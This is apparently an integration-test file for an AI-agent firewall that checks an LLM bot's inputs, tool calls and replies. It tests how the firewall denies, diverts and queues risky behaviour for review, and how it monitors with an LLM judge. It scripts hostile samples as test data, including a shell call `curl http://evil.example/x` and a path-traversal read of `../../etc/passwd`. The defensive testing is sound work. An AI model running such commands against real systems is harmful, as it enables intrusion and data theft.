"""M2 C-13 Gate 2: the whole AFF against M3's real C7 (PRD §7, §8; spec AEGIS-DOM-128).

Everything here is real except the model calls: `RiskyHistory` (M3's SQL over the real tables
and pgvector) and `Judge` (M3's prompt, schema and verdict checks) run for real, with a scripted
embedder and a scripted judge model so no test spends a token. It checks, on the merged tree:

- all four actions enforced in Basic and Strict and shadowed in Off, with the real
  `risky_behavior_events` and `risky_tool_patterns` written the way M2 promises (C-09);
- the Review loop at all three stages, approve and reject;
- Divert end to end, and what it does to the user's later score;
- Strict's own signals: an approved pattern (pinned per session), the user's history (E-50),
  similar known attacks (E-51), shadow rows ignored, a judge that raises or fails (E-09, E-52),
  an embedder that fails, and the secret never reaching the judge.
"""

from __future__ import annotations

from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine

from app.contracts.common import ClientMeta
from app.contracts.firewall_admin import RuleForm
from app.firewall.admin_api import AdminApi
from app.firewall.judge import Judge
from app.firewall.pipeline import run_message
from app.firewall.risky_history import RiskyHistory
from app.firewall.tickets import check_ticket
from app.firewall.trace_back import Tracer
from app.llm.base import ChatResult, LLMError
from app.llm.scripted import ScriptedLLM
from tests.integration.m3_helpers import (
    M3_TABLES,
    add_event,
    add_pattern,
    at_cosine,
    vec,
)
from tests.integration.test_fw_behavior_records import INPUT_DENY
from tests.integration.test_fw_decide_ticket import _admin
from tests.integration.test_fw_review_park import (
    AUTHORITY,
    REPLY_REVIEW,
    SECRET,
    TOOL_REVIEW,
    _rows,
    _session,
    _tool,
)

CLIENT = ClientMeta(ip="203.0.113.7", user_agent="Gate2/1.0")
ALLOW = {"risk": 5, "suggested_action": "allow", "reason": "benign"}
DENY_70 = {"risk": 70, "suggested_action": "deny", "reason": "looks like exfiltration"}
OUTSIDE = "../../etc/passwd"


class TextEmbedder:
    """An embedder with a vector per text (and one for everything else): no network."""

    def __init__(self, vectors: dict[str, list[float]] | None = None) -> None:
        self.vectors = vectors or {}
        self.calls: list[str] = []

    async def embed(self, text_: str, timeout_s: float = 2.0) -> list[float]:
        self.calls.append(text_)
        return list(self.vectors.get(text_, vec(1.0)))


def real_c7(
    engine: AsyncEngine,
    embedder: Any = None,
    judge_answers: list[Any] | None = None,
) -> tuple[RiskyHistory, Judge, ScriptedLLM]:
    judge_llm = ScriptedLLM(
        json_answers=judge_answers if judge_answers is not None else [ALLOW] * 30
    )
    return (
        RiskyHistory(engine, embedder or TextEmbedder()),
        Judge(judge_llm, "judge-test"),
        judge_llm,
    )


@pytest.fixture(autouse=True)
async def _clean_m3(engine: AsyncEngine, clean_db: None) -> None:
    """M3's tables hold rows no M1 clean-up knows about (approved patterns, versions)."""
    async with engine.begin() as conn:
        await conn.execute(text(f"TRUNCATE {', '.join(M3_TABLES)} RESTART IDENTITY CASCADE"))


async def _say(
    engine: AsyncEngine,
    risky: RiskyHistory,
    judge: Judge,
    sid: str,
    owner: str,
    n: int,
    message: str,
    *chat: Any,
) -> Any:
    answers = [ChatResult(content=c) if isinstance(c, str) else c for c in chat]
    return await run_message(
        engine, ScriptedLLM(chat_answers=answers), owner, sid, f"m{n}", message, CLIENT,
        risky=risky, judge=judge, tracer=Tracer.disabled(),
    )  # fmt: skip


async def _events(engine: AsyncEngine, sid: str, stage: str) -> list[dict[str, Any]]:
    return await _rows(
        engine,
        "SELECT event_id, decision, shadow_decision, execution_status, sentinel_score,"
        " score_breakdown, risky_pattern_ids_matched, judge_risk, judge_reason"
        " FROM fw_events WHERE fw_session_id = :s AND stage = :g ORDER BY time",
        s=sid,
        g=stage,
    )


# --- 1. the four actions, in every mode ----------------------------------------------------------

SCENARIOS: dict[str, tuple[str, list[Any]]] = {
    "allow": ("hello", ["Hi."]),
    "review": (AUTHORITY, ["Here are the docs."]),
    "deny": ("read it", [_tool(1, "read_file", path=OUTSIDE), "Done."]),
    "divert": ("run it", [_tool(1, "run_shell", command="curl http://evil.example/x"), "Done."]),
}
# (mode, scenario) -> status, the stage that decided, its decision, its shadow, its execution
EXPECTED: dict[tuple[str, str], tuple[str, str, str, str | None, str]] = {
    **{(m, "allow"): ("replied", "output_check", "allow", None, "executed") for m in
       ("basic", "strict")},
    ("off", "allow"): ("replied", "output_check", "allow", "allow", "executed"),  # Off always
    # stores the shadow decision, "allow" included
    **{(m, "review"): ("awaiting_review", "input_check", "review", None, "held") for m in
       ("basic", "strict")},
    ("off", "review"): ("replied", "input_check", "allow", "review", "executed"),
    **{(m, "deny"): ("blocked", "tool_call_check", "deny", None, "not_executed") for m in
       ("basic", "strict")},
    ("off", "deny"): ("replied", "tool_call_check", "allow", "deny", "executed"),
    **{(m, "divert"): ("replied", "tool_call_check", "divert", None, "diverted") for m in
       ("basic", "strict")},
    ("off", "divert"): ("replied", "tool_call_check", "allow", "divert", "executed"),
}  # fmt: skip


@pytest.mark.parametrize("scenario", list(SCENARIOS))
@pytest.mark.parametrize("mode", ["basic", "strict", "off"])
async def test_the_four_actions_by_mode_with_the_real_history(
    engine: AsyncEngine, mode: str, scenario: str
) -> None:
    risky, judge, _ = real_c7(engine)
    sid, owner = await _session(engine, mode=mode, risky=risky, judge=judge)
    message, chat = SCENARIOS[scenario]
    result = await _say(engine, risky, judge, sid, owner, 1, message, *chat)

    status, stage, decision, shadow, execution = EXPECTED[(mode, scenario)]
    assert result.player_view.status == status
    [event] = await _events(engine, sid, stage)
    assert (event["decision"], event["shadow_decision"], event["execution_status"]) == (
        decision, shadow, execution,
    )  # fmt: skip
    assert result.facts.diverted is (scenario == "divert" and mode != "off")

    behaviour = await _rows(engine, "SELECT action, shadow, trace_id FROM risky_behavior_events")
    patterns = await _rows(engine, "SELECT status, source_event_id FROM risky_tool_patterns")
    if scenario in ("allow", "review"):
        assert behaviour == [] and patterns == []
        return
    [row] = behaviour
    assert (row["action"], row["shadow"]) == (scenario, mode == "off")
    assert (row["trace_id"] is not None) is (scenario == "divert" and mode != "off")
    if mode == "off":
        assert patterns == []  # nothing was denied or diverted, so nothing to learn from
    else:
        assert [p["status"] for p in patterns] == ["candidate"]


# --- 2. the Review loop at all three stages -----------------------------------------------------

REVIEWS: dict[str, tuple[RuleForm | None, str, list[Any], list[Any]]] = {
    # stage: (extra rule, message, what the bot says first, what it says after an approval)
    "input": (None, AUTHORITY, ["unused"], ["Here are the docs."]),
    "tool": (
        TOOL_REVIEW, "find payroll",
        [_tool(1, "search_docs", query="payroll"), "unused"], ["Found the payroll doc."],
    ),
    "reply": (REPLY_REVIEW, "how are we?", ["The quarterly numbers are up 4%."], []),
}  # fmt: skip


@pytest.mark.parametrize("decision", ["ok", "not_ok"])
@pytest.mark.parametrize("stage", list(REVIEWS))
async def test_the_review_loop_at_each_stage(
    engine: AsyncEngine, stage: str, decision: str
) -> None:
    extra, message, first, after = REVIEWS[stage]
    risky, judge, _ = real_c7(engine)
    sid, owner = await _session(engine, mode="strict", extra=extra, risky=risky, judge=judge)
    held = await _say(engine, risky, judge, sid, owner, 1, message, *first)
    assert held.player_view.status == "awaiting_review"
    tid = held.player_view.ticket_id or ""

    continuation = ScriptedLLM(chat_answers=[ChatResult(content=a) for a in after])
    api = AdminApi(engine, continuation, risky, judge)
    admin = await _admin(engine)
    queue = await api.list_pending_tickets()
    assert [q.ticket_id for q in queue] == [tid]
    await api.decide_ticket(tid, decision, admin)

    final = (await check_ticket(engine, owner, tid)).turn_result
    assert final is not None
    behaviour = await _rows(engine, "SELECT action FROM risky_behavior_events")
    if decision == "ok":
        assert final.player_view.status == "replied"
        assert behaviour == []
        if stage == "reply":
            assert continuation.chat_calls == []  # E-46b: released as checked, no model call
    else:
        assert final.player_view.status == "human_denied"
        assert [b["action"] for b in behaviour] == ["human_deny"]
        patterns = await _rows(engine, "SELECT tool FROM risky_tool_patterns")
        assert [p["tool"] for p in patterns] == (["search_docs"] if stage == "tool" else [])


# --- 3. Divert end to end ----------------------------------------------------------------------


async def test_divert_end_to_end_and_the_next_score_remembers_it(engine: AsyncEngine) -> None:
    from app.firewall.read_api import FirewallRead

    embedder = TextEmbedder(
        {"run it": vec(1.0), "hello again": vec(0.0, 1.0), "hi.": vec(0.0, 1.0)}
    )
    risky, judge, _ = real_c7(engine, embedder=embedder)
    sid, owner = await _session(engine, mode="strict", risky=risky, judge=judge)
    divert = SCENARIOS["divert"]
    first = await _say(engine, risky, judge, sid, owner, 1, divert[0], *divert[1])
    # the rest of the diverted turn is not re-scored by its own divert or its own record
    assert first.facts.diverted is True and first.player_view.status == "replied"
    [reply_check] = await _events(engine, sid, "output_check")
    assert reply_check["score_breakdown"]["prior_divert"] == 0
    assert reply_check["score_breakdown"]["similarity"] == 0

    read = FirewallRead(engine)
    [item] = await read.get_diverts(sid)
    assert item.tool == "run_shell" and "run it" in item.attempted_summary
    api = AdminApi(engine, ScriptedLLM(), risky, judge)
    from app.contracts.firewall_admin import EventFilter

    [admin_item] = await api.list_diverts_admin(EventFilter())
    assert admin_item.trace_back is not None and admin_item.trace_back.tools_called == ["run_shell"]

    second = await _say(engine, risky, judge, sid, owner, 2, "hello again", "Hi.")
    assert second.player_view.status == "replied"
    first_input, later_input = await _events(engine, sid, "input_check")
    assert first_input["score_breakdown"]["prior_divert"] == 0
    assert later_input["score_breakdown"]["prior_divert"] == 20  # real SQL: an earlier divert


# --- 4. Strict's own signals ---------------------------------------------------------------------


async def test_an_approved_pattern_protects_new_sessions_only(engine: AsyncEngine) -> None:
    risky, judge, _ = real_c7(engine)
    old, old_owner = await _session(
        engine, mode="strict", risky=risky, judge=judge, sub="auth0|old"
    )
    async with engine.begin() as conn:
        pattern = await add_pattern(
            conn, tool="query_db", conditions=[{"arg": "sql", "op": "regex", "value": "(?i)salary"}]
        )
    new, new_owner = await _session(
        engine, mode="strict", risky=risky, judge=judge, sub="auth0|new"
    )
    call = _tool(1, "query_db", sql="SELECT salary FROM employees")

    still = await _say(engine, risky, judge, old, old_owner, 1, "look", call, "Done.")
    assert still.player_view.status == "replied"  # pinned before the approval (E-57)
    stopped = await _say(engine, risky, judge, new, new_owner, 1, "look", call, "Done.")
    assert stopped.player_view.status == "blocked"
    [event] = await _events(engine, new, "tool_call_check")
    assert (event["decision"], event["risky_pattern_ids_matched"]) == ("deny", [pattern])


async def test_the_users_history_counts_and_shadow_rows_do_not(engine: AsyncEngine) -> None:
    risky, judge, _ = real_c7(engine)
    attack = _tool(1, "read_file", path=OUTSIDE)
    safe = _tool(1, "read_file", path="docs/faq.md")

    off, owner = await _session(engine, mode="off", risky=risky, judge=judge)
    await _say(engine, risky, judge, off, owner, 1, "read it", attack, "Done.")  # a shadow row

    async def tool_event(label: str, call: Any, *, mode: str = "strict") -> dict[str, Any]:
        sid, _ = await _session(engine, mode=mode, risky=risky, judge=judge, owner=owner)
        await _say(engine, risky, judge, sid, owner, 1, label, call, "Done.")
        return (await _events(engine, sid, "tool_call_check"))[0]

    quiet = await tool_event("read it", safe)
    assert quiet["score_breakdown"]["user_history"] == 0  # M3-X07: shadow rows are ignored
    first = await tool_event("read it", attack)
    assert first["decision"] == "deny"
    second = await tool_event("read it", attack)  # E-50: the same user tries again
    assert second["score_breakdown"]["user_history"] == 15
    assert second["sentinel_score"] == first["sentinel_score"] + 15 and second["decision"] == "deny"


async def test_a_paraphrase_of_a_known_attack_scores_similarity(engine: AsyncEngine) -> None:
    embedder = TextEmbedder({"forbidden word one": vec(1.0), "forbidden word two": at_cosine(0.9)})
    risky, judge, _ = real_c7(engine, embedder=embedder)
    a, owner_a = await _session(
        engine, mode="strict", extra=INPUT_DENY, risky=risky, judge=judge, sub="auth0|a"
    )
    first = await _say(engine, risky, judge, a, owner_a, 1, "forbidden word one")
    assert first.player_view.status == "blocked"  # recorded with its embedding

    b, owner_b = await _session(engine, mode="strict", risky=risky, judge=judge, sub="auth0|b")
    await _say(engine, risky, judge, b, owner_b, 1, "forbidden word two")
    [event] = await _events(engine, b, "input_check")
    assert event["score_breakdown"]["similarity"] == 25  # E-51: cosine 0.9 is 0.85 or more


# --- the judge and the embedder, real ------------------------------------------------------------


async def _two_prior_search_events(engine: AsyncEngine, owner: str) -> None:
    async with engine.begin() as conn:
        for n in range(2):
            await add_event(conn, owner, tool="search_docs", event_id=f"evt-seed-{n}")


async def _judged_turn(
    engine: AsyncEngine, answers: list[Any], query: str = "faq"
) -> tuple[str, Any, ScriptedLLM]:
    risky, judge, judge_llm = real_c7(engine, judge_answers=answers)
    sid, owner = await _session(engine, mode="strict", risky=risky, judge=judge)
    await _two_prior_search_events(engine, owner)  # 30 history points: the judge is asked
    result = await _say(
        engine, risky, judge, sid, owner, 1, "find it",
        _tool(1, "search_docs", query=query), "Found it.",
    )  # fmt: skip
    return sid, result, judge_llm


async def test_the_real_judge_can_raise_the_decision(engine: AsyncEngine) -> None:
    sid, result, judge_llm = await _judged_turn(engine, [DENY_70])
    assert result.player_view.status == "blocked" and len(judge_llm.json_calls) == 1
    [event] = await _events(engine, sid, "tool_call_check")
    assert (event["decision"], event["judge_risk"]) == ("deny", 70)
    assert event["judge_reason"] == "looks like exfiltration"


async def test_a_low_judge_risk_never_lowers_the_score(engine: AsyncEngine) -> None:
    sid, result, _ = await _judged_turn(engine, [ALLOW])
    [event] = await _events(engine, sid, "tool_call_check")
    assert (event["judge_risk"], event["sentinel_score"]) == (5, 30)  # E-52: the 30 stays
    # 30 is the Strict review threshold, and the judge saying "fine" does not change that
    assert event["decision"] == "review" and result.player_view.status == "awaiting_review"


async def test_an_answer_the_real_judge_rejects_is_a_deny(engine: AsyncEngine) -> None:
    mismatched = {"risk": 5, "suggested_action": "deny", "reason": "risk and action disagree"}
    sid, result, _ = await _judged_turn(engine, [mismatched])
    assert result.player_view.status == "blocked"
    [event] = await _events(engine, sid, "tool_call_check")
    assert event["decision"] == "deny" and event["judge_risk"] is None
    assert event["sentinel_score"] >= 60  # at least the Deny band


async def test_the_secret_never_reaches_the_real_judges_prompt(engine: AsyncEngine) -> None:
    _, _, judge_llm = await _judged_turn(engine, [ALLOW], query=f"payroll {SECRET}")
    assert judge_llm.json_calls  # the judge really was asked
    for call in judge_llm.json_calls:
        assert SECRET not in call.prompt and SECRET[5:] not in call.prompt
    assert any("withheld" in call.prompt for call in judge_llm.json_calls)


async def test_a_failing_embedder_is_a_deny_not_an_error(engine: AsyncEngine) -> None:
    risky, judge, _ = real_c7(engine, embedder=ScriptedLLM(embeddings=[LLMError("boom")]))
    sid, owner = await _session(engine, mode="strict", risky=risky, judge=judge)
    result = await _say(engine, risky, judge, sid, owner, 1, "hello", "Hi.")
    assert result.player_view.status == "blocked"
    [event] = await _events(engine, sid, "input_check")
    assert event["decision"] == "deny"  # M3-X10: fail closed


# --- the seams ------------------------------------------------------------------------------------


@pytest.fixture
def every_seam_real(monkeypatch: pytest.MonkeyPatch) -> Any:
    from app.config import get_settings
    from app.db.engine import get_engine
    from app.firewall import ports
    from tests.integration.conftest import database_url

    monkeypatch.setenv("AEGIS_USE_FAKES", "")
    monkeypatch.setenv("DATABASE_URL", database_url())
    monkeypatch.setenv("GEMINI_API_KEY", "test-key-not-real")  # built, never called
    monkeypatch.setenv("AEGIS_BOT_MODEL_ID", "bot-test")
    monkeypatch.setenv("AEGIS_GEMINI_FLASH_MODEL_ID", "flash-test")
    monkeypatch.setenv("AEGIS_GEMINI_EMBEDDING_MODEL_ID", "embedding-test")
    get_settings.cache_clear()
    get_engine.cache_clear()
    ports.reset()
    yield ports
    ports.reset()
    get_engine.cache_clear()
    get_settings.cache_clear()


async def test_with_no_fakes_every_seam_is_real_and_a_strict_session_registers(
    every_seam_real: Any,
) -> None:
    from app.arena.scenario_data import SYSTEM_PROMPT
    from app.arena.seed import DEFAULT_WEIGHTS, STRICT_THRESHOLDS, build_mock_state
    from app.contracts.firewall import AgentDefinition, LevelConfig, RegisterSession
    from tests.integration.test_fw_review_park import DEFS

    ports = every_seam_real
    firewall, read, admin = (
        ports.get_firewall(),
        ports.get_firewall_read(),
        ports.get_firewall_admin(),
    )
    risky, judge = ports.get_risky_history(), ports.get_judge()
    arena = ports.get_arena_service()
    assert type(firewall).__name__ == "RealFirewall" and type(read).__name__ == "FirewallRead"
    assert type(admin).__name__ == "AdminApi" and type(risky).__name__ == "RiskyHistory"
    assert type(judge).__name__ == "Judge" and not type(arena).__name__.startswith("Fake")

    from app.db.engine import get_engine
    from app.firewall.seed import seed

    await seed(get_engine())
    async with get_engine().begin() as conn:
        owner = str(
            (
                await conn.execute(
                    text(
                        "INSERT INTO users (auth0_sub, role) VALUES ('auth0|seam', 'student')"
                        " RETURNING id"
                    )
                )
            ).scalar_one()
        )
    handle = await firewall.register_session(
        RegisterSession(
            owner_ref=owner,
            agent=AgentDefinition(system_prompt=SYSTEM_PROMPT, tools=DEFS, model_id="bot-test"),
            level=LevelConfig(
                level_id="lvl-3", level_version=1, mode="strict", rule_version=0,
                weights=DEFAULT_WEIGHTS, thresholds=STRICT_THRESHOLDS, divert_enabled=True,
            ),
            secret=SECRET,
            mock_state_seed=build_mock_state("lvl-3", SECRET),
        )
    )  # fmt: skip
    summary = await read.get_manifest_summary(handle.fw_session_id)
    assert summary.judge_model_id == "flash-test" and summary.judge_policy_hash.startswith(
        "sha256:"
    )
